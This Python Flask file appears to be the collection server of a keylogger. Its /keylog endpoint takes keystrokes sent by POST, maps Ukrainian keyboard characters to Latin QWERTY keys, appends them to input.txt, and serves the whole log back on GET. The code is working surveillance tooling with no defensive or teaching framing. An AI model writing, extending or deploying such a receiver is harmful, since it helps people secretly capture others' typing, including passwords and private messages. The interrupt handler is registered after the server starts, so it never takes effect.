from flask import Flask, request
import signal

def handler(signum, frame):
    print("Ignoring interrupt")

dictonery = {
    "ґ": "`",
    "я": "z",
    "ч": "x",
    "с": "c",
    "м": "v",
    "и": "b",
    "т": "n",
    "ь": "m",
    "б": ",",
    "ю": ".",
    ".": "/",
    "ф": "a",
    "і": "s",
    "в": "d",
    "а": "f",
    "п": "g",
    "р": "h",
    "о": "j",
    "л": "k",
    "д": "l",
    "ж": ";",
    "є": "'",
    "й": "q",
    "ц": "w",
    "у": "e",
    "к": "r",
    "е": "t",
    "н": "y",
    "г": "u",
    "ш": "i",
    "щ": "o",
    "з": "p",
    "х": "[",
    "ї": "]",
    "1": "1",
    "2": "2",
    "3": "3",
    "4": "4",
    "5": "5",
    "6": "6",
    "7": "7",
    "8": "8",
    "9": "9",
    "0": "0",
    "-": "-",
    "=": "="
}


app = Flask(__name__)
@app.route('/', methods=['GET'])
def home():
    return 'Home page'
@app.route('/keylog', methods=['GET', 'POST'])
def keylog():
    if request.method == 'POST':
        data = request.get_data(as_text=True)  # Decode the request data
        print("Received input:", data)

        try:
            data = dictonery[data] # space
        except:
            pass

        with open("input.txt", "a+") as file:
            file.write(data + "\n")
        
        return 'Data received: ' + data  # Respond with the received data
    else:
        with open("input.txt", "r") as file:
            data = file.read()
            file.close()
        return 'Data received: ' + data  # Respond with the received data

if __name__ == "__main__":
    app.run(port=7888)
    signal.signal(signal.SIGINT, handler)

